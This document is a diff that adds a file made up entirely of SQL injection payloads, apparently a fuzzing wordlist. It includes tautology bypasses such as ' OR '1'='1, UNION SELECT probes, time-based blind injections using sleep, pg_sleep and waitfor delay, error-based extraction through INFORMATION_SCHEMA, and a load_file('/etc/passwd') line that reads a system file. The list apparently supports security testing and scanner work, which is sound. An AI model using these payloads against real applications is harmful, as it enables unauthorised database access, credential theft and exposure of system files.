@@ -1,0 +1,51 @@
+'
+' OR '' = '
+' OR '1
+' OR '1'='1
+' OR 'x'='x
+' OR 1 -- -
+' UNION ALL SELECT
+' UNION SELECT
+' UNION SELECT sum(columnname ) from tablename --
+1 AND (SELECT * FROM Users) = 1
+1 or 1=1
+1 or benchmark(10000000,MD5(1))#
+1 or pg_sleep(5)--
+1 or pg_sleep(__TIME__)--
+1 or sleep(5)#
+1 or sleep(__TIME__)#
+1 waitfor delay '0:0:10'--
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+1' ORDER BY 1,2,3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+AND 0
+AND 1
+AND 1083=1083 AND ('1427=1427
+AND 1083=1083 AND (1427=1427
+AND 1=0
+AND 1=0 AND '%'='
+AND 1=0#
+AND 1=0--
+AND 1=1
+AND 1=1 AND '%'='
+AND 1=1#
+AND 1=1--
+union select
+union select * from users where login = char ...
+union select 1,load_file('/etc/passwd'),1,1,1;
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' OR full_name LIKE '%Bob%
+x' or 1=1 or 'x'='y
